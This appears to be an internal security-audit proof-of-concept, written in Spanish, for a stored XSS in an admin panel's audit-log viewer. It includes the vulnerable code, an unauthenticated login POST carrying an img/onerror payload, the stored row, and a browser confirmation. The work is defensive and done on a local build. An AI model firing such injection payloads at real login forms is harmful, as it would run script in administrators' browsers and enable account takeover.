@@ -1,0 +1,128 @@
+PoC AUD-POC-4 (F2.2 — Vector 2, XSS stored vía metadata del log)
+================================================================
+
+Entorno: panel-admin local (localhost:3002), build dev, migraciones aplicadas
+hasta 20260922000002_create_audit_logs_table.sql.
+
+No se necesita sesión ni cuenta: el punto de entrada es el propio formulario
+de login público (/auth/login), sin autenticar.
+
+Código vulnerable (sumidero / sink):
+  apps/panel-admin/src/features/audit-log/components/AuditLogDetailDrawer/AuditLogDetailDrawer.tsx:65-69
+    <div
+      className={...}
+      dangerouslySetInnerHTML={{ __html: formatMetadataHtml(row.metadata) }}
+    />
+
+  packages/core/src/audit/shared/utils.ts:74-87 (formatMetadataHtml)
+    El propio comentario del código lo admite: "Values are interpolated
+    as-is (no HTML escaping) so the consumer can opt into
+    dangerouslySetInnerHTML." Cada valor de metadata se interpola crudo en
+    un string HTML (`<span class="audit-meta-value">${rendered}</span>`),
+    sin pasar por ningún escape/encode.
+
+Código vulnerable (punto de entrada / fuente):
+  apps/panel-admin/src/features/auth/services/loginAction.ts:15,25-31
+    const email = formData.get("email") as string;   // sin validar
+    ...
+    await logAuditEvent({
+      actorEmail: email,
+      action: AUDIT_ACTIONS.AUTH_LOGIN_FAILED,
+      metadata: { email, reason: error?.message ?? "Invalid credentials" },
+      ...
+    });
+  El campo `email` del formulario de login se persiste tal cual en
+  `audit_logs.metadata.email` en cada intento fallido, sin ningún intento de
+  login exitoso de por medio y sin pasar por ninguna sesión.
+
+### Paso 1 — inyección (sin autenticar, formulario público de login)
+
+  POST /auth/login HTTP/1.1
+  Host: localhost:3002
+  Content-Type: multipart/form-data; boundary=...
+
+  $ACTION_REF_1=1
+  $ACTION_1:0={"id":"60198dbebd704278b61c6fdf4ad4a8b3260ea9372f","bound":"$@1"}
+  $ACTION_1:1=[null]
+  $ACTION_KEY=ka4e67fa89daaee8f9a9ec0e796af9806
+  email=<img src=x onerror="document.title=AUD-POC-4-XSS">
+  password=whatever
+
+  Respuesta: INVALID_CREDENTIALS (login falla, como se espera — el payload
+  no necesita ser un email válido porque nunca se valida server-side).
+
+### Paso 2 — confirmación de almacenamiento sin sanitizar
+
+Con una sesión admin cualquiera (misma cuenta sin audit:view de F2.1,
+`vargasarayafabian11@gmail.com` — demuestra que ni siquiera se necesita el
+permiso para ver el payload, por AUD-POC-1), se invoca getAuditLogs
+normalmente (filtrando por action=auth.login.failed):
+
+  Respuesta (fila relevante):
+  {
+    "id": "b722a112-0e26-4b0d-a578-c0f6f079e6c2",
+    "actor_email": "<img src=x onerror=\"document.title=AUD-POC-4-XSS\">",
+    "action": "auth.login.failed",
+    "metadata": {
+      "email": "<img src=x onerror=\"document.title=AUD-POC-4-XSS\">",
+      "reason": "Invalid login credentials"
+    },
+    "ip_address": "::1",
+    "user_agent": "curl/8.22.0",
+    "created_at": "2026-10-16T01:43:45.131312+00:00"
+  }
+
+El payload llega intacto, sin ningún carácter escapado (`<`, `"`, `=`
+literales).
+
+### Paso 3 — ejecución confirmada con navegador real (Playwright + Chromium) — 2026-10-16
+
+Re-test en vivo, sesión autenticada real de `vargasarayafabian11@gmail.com`
+(sin `audit:view`) en `/admin/audit-log`:
+
+1. Primer intento con el payload original (`email=<img src=x
+   onerror="document.title=AUD-POC-4-XSS">`, sin comillas internas en el
+   valor del JS): al abrir el drawer, la consola del navegador mostró:
+     `ReferenceError: AUD is not defined`
+     `    at HTMLImageElement.onerror (http://localhost:3002/admin/audit-log:1:16)`
+   Esto YA prueba ejecución real (`HTMLImageElement.onerror` corriendo en
+   el origen de la página) — el error es solo un bug de comillas en el
+   payload de prueba (`document.title=AUD-POC-4-XSS` se evalúa como
+   `AUD - POC - 4 - XSS`, variables indefinidas), no una mitigación de la
+   app.
+2. Payload corregido (`email=<img src=x
+   onerror="document.title='AUD-POC-4-XSS-v2'">`, con comillas internas):
+   al abrir el drawer de esa fila, el título de la pestaña del navegador
+   cambió de "Panel de Administración" a **"AUD-POC-4-XSS-v2"**,
+   confirmado con `document.title` vía DevTools Protocol.
+
+`row.metadata` se pasa a `formatMetadataHtml`, que devuelve el string sin
+escapar:
+  `<div class="audit-meta-row"><strong>email</strong><span class="audit-meta-value"><img src=x onerror="document.title='AUD-POC-4-XSS-v2'"></span></div>`
+inyectado sin más vía `dangerouslySetInnerHTML` en `AuditLogDetailDrawer`.
+Un `<img>` con `onerror` insertado vía `innerHTML` SÍ ejecuta su manejador
+de evento al fallar la carga de `src=x` (a diferencia de un `<script>`
+inyectado por innerHTML, que el navegador no ejecuta) — es el vector
+estándar para XSS stored a través de `dangerouslySetInnerHTML`/`innerHTML`.
+
+Evidencia visual: captura `F2.2-xss-executed-drawer.png` — nótese el
+contraste dentro de la misma captura: el campo "Actor" (renderizado por
+React, `{row.actor_email}`) muestra el payload como texto literal escapado
+("<img src=x onerror=...>"), mientras que "Metadatos → email" (renderizado
+vía `dangerouslySetInnerHTML`) muestra el ícono roto de una imagen real —
+porque el navegador SÍ creó un elemento `<img>` de verdad ahí, no texto.
+
+Impacto: XSS stored, sin autenticación para inyectar (cualquiera en
+internet puede intentar un login con un email malicioso), que se ejecuta
+en el navegador de CUALQUIER admin que abra el visor de auditoría —
+incluyendo cuentas owner. Combinado con AUD-POC-1 (acceso sin audit:view),
+el payload es visible para el conjunto más amplio posible de admins.
+
+Clasificación: REAL. Es exactamente la cadena O3/AU-R01 de
+fase-1-diagnostico.md (riesgo ya calificado ahí como el más grave del
+módulo: "Crítico (16)" — sin cuenta, sin permisos, cebo irresistible, sin
+CSP que lo contenga). No se introdujo nada.
+
+### Commit donde se reprodujo
+`develop @ f9f8c8b` / branch `security/audit/fase2-pocs`, sin modificaciones
+de código.
